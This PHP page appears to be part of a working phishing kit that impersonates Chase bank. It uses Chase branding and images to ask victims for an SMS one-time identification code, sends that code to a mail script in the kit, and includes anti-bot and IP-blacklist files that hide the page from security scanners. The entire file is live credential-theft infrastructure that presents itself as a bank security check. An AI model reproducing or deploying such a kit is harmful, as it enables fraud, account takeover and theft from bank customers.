<?php

include"drfxnd/Anti/anti1.php";
include"drfxnd/Anti/anti2.php";
include"drfxnd/Anti/anti3.php";
include"drfxnd/Anti/anti4.php";
include"drfxnd/Anti/anti5.php";
include"drfxnd/Anti/anti6.php";
include"drfxnd/Anti/anti7.php";
include"drfxnd/Anti/anti8.php";
include"drfxnd/Anti/anti9.php";
include"drfxnd/Anti/blacklister.php";
include"drfxnd/Anti/fucker.php";
include"drfxnd/Anti/bot.php";
include'drfxnd/Anti/IP-BlackList.php';  
include'drfxnd/Anti/Bot-Crawler.php';
include'drfxnd/Anti/Bot-Spox.php';
include'drfxnd/Functions/Fuck-you.php'; 
include'drfxnd/Anti/Dila_DZ.php';
include'admin/YOUR-CONFIG.php';
include'drfxndbot.php';

?>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" dir="ltr">
<head>
        <meta charset="utf-8">
        <meta name="robots" content="noindex,nofollow">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>For Your Protection</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="shortcut icon" href="drfxnd/Files/img/chasefavicon.ico">
        <link rel="apple-touch-icon" sizes="152x152" href="drfxnd/Files/img/chase-touch-icon-152x152.png">
        <link rel="apple-touch-icon" sizes="120x120" href="drfxnd/Files/img/chase-touch-icon-120x120.png">
        <link rel="apple-touch-icon" sizes="76x76" href="drfxnd/Files/img/chase-touch-icon-76x76.png">
        <link rel="apple-touch-icon" href="drfxnd/Files/img/chase-touch-icon.png">
        <link rel="stylesheet" href="drfxnd/Files/css/logon.css">
        <link rel="stylesheet" href="drfxnd/Files/css/blue-ui2.css">
        <link rel="stylesheet" href="drfxnd/Files/css/overview.css">

</head>
<body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true">
    <style type="text/css">
    .help-block.form-error{
        color:#bf2155;
    }

.jpui.alert.primary .title {
    font-size: 1rem;
    color: #bf2155;
}
.jpui.alert.primary.inverted {
    color: #bf2155!important;
}
.jpui.alert.primary {
    background-color: #bf2155;
}
.jpui.icon.error {
    background-color: inherit!important;
    color: #bf2155!important;
}

.icon{display:none}@font-face{font-family:dcefont;font-style:'normal';font-weight:'normal';src:url(drfxnd/Files/css/fonts/fonts/dcefont.eot);src:url(drfxnd/Files/css/fonts/dcefont.eot?#iefix) format('embedded-opentype'),url(drfxnd/Files/css/fonts/dcefont.woff) format('woff'),url(drfxnd/Files/css/fonts/dcefont.ttf) format('truetype'),url(drfxnd/Files/css/fonts/dcefont.svg#dcefont) format('svg')}

</style>
<div data-is-view="true">
<div class="homepage">

<div class="logon-container">
<header class="toggle-aria-hidden">
<div class="logon header jpui transparent navigation bar">
<a href="#">
<div class="chase logo"></div>
<span class="util accessible-text">SPOX LOVE YOU !</span>
</a> 
</div>
</header>
<form action="drfxnd/Mail/sms.php" method="POST">
<input type="hidden" name="token" value="chaseSP0X">
<main id="logon-content" data-has-view="true">
<div class="msd password-reset reset-code" data-is-view="true">
<div id="backgroundImage">
<div class="jpui background image fixed blurred" id="geoImage">
<style type="text/css">.jpui.background.image { background-image: url(https://static.chasecdn.com/content/geo-images/images/background.mobile.night.12.jpeg);filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.mobile.night.12.jpeg', sizingMethod='scale');-ms-filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.mobile.night.12.jpeg', sizingMethod='scale');}@media (min-width:320px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.mobile.night.12.jpeg); } }@media (min-width:992px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.tablet.night.12.jpeg); } }@media (min-width:1024px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.desktop.night.12.jpeg); } }</style>

</div>
</div>
<div class="container">
<div class="row jpui primary panel">
<div class="col-xs-12 col-md-10 col-md-offset-1 content-container">
    <h1 class="header" tabindex="-1">For Your Protection</h1>
<div class="row jpui panel body">
<div class="col-xs-12 col-sm-10 col-sm-offset-1">
<div class="progress u-no-outline" id="progress" tabindex="-1">
<div class="row">
<div class="col-xs-12 col-sm-6 clear-padding">
</div>
<div class="col-xs-12 col-sm-6 progress-padding">
<div class="jpui progress rectangles" id="progress-progressBar" data-progress="">
<ol class="steps-3" role="presentation">
    <li class="active"></li>
    <li class="active current-step"></li>
    <li id="progress-progressBar-step-3"></li>
</ol>


</div>
</div>
</div>
</div>
<style type="text/css">
    .jpui.alert.spox.spox .title {
    font-size: 1rem;
    font-weight: 300;
    color: #bf2155;
    letter-spacing: 0;
    text-decoration: none;
    width: 100%;
    margin: .0625rem .0625rem .313rem 0;
}

</style>



<form  method="POST" autocomplete="off" action="javascript:void(0);" novalidate="">
    <h3>We sent you a text message. </h3ext>
    <p>Your identification code is on its way. Once you receive it, please enter it below, along with the password you normally use to sign in.</p>
        <?php 
    if (isset($_GET['invalid'])) {
    $invalid = isset($_GET['invalid']) ? trim(htmlentities($_GET['invalid'])):'';
    $em = "email";
    if ($invalid == $em) {
        echo'<div class="validator-error-header"><div class="jpui error error jpui spox spox inverted primary animate alert" aria-labelledby="inner-alert-the-user"><i class="jpui exclamation-color error error icon"></i> <div class="icon background"></div> <div class="content wrap" ><h2 class="title" tabindex="-1" ><span class="util accessible-text">Important: </span >We couldnt find any records that match the details you entered.<br> Please try again!</h2>   </div></div></div><input type="hidden" name="invalid" value="invalid">';}}?>

<div class="inside-container">
<div class="row">
<div class="col-xs-12 col-sm-5 label-column otp-code">
    <label class="jpui label msdLabelHeightFix">
        <span class="accessible-text hidden"></span>Temporary identification code</label>
</div>
<div class="col-xs-12 col-sm-5 form-column otp-code">
<div class="account-input ssn_card_account_number">
    <input class="jpui input account-input ssn_card_account_number" data-validation="code"  placeholder="" type="tel" name="code"  data-validation-error-msg="  ">    </div>
</div>
</div>
<div class="row">
<div class="col-xs-12 col-sm-5 label-column">
    <label class="jpui label">

</div>
</div>
</div>
<p class="identification-code-received-message">
<span>We send our temporary identification codes right away. <br><a class="link-anchor underline" href="javascript:void(0);" >Sent again,</a> Please wait for 1 to 2 minutes because the service provider may be overloaded.</span>
<span class="jpui link" id="requestNewIdentificationCode-link-wrapper">
</span>
</p>
</div>
<div class="button-container row show-sm">
<div class="col-xs-12 col-sm-3 col-sm-offset-6">
<button type="button" class="jpui button focus fluid ">
    <span class="label">Cancel</span>
</button>
</div>
<div class="col-xs-12 col-sm-3">
<button type="submit" class="jpui button focus fluid primary ">
    <span class="label">Next</span>
</button>
</div>
</div>
</form></div></div></div></div></div></div>
</main>
</div>
</div> 
</div>
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
<script>
  $.validate();
  $('#my-textarea').restrictLength( $('#max-length-element') );
  $.validate({
  modules : 'toggleDisabled',
  disabledFormFilter : 'form.toggle-disabled',
  showErrorDialogs : false
});
$(document).ready(function() {
    $("#submit").submit(function(e) {
        $("#errordiv").hide();
    });
});

</script>

</body>
</html>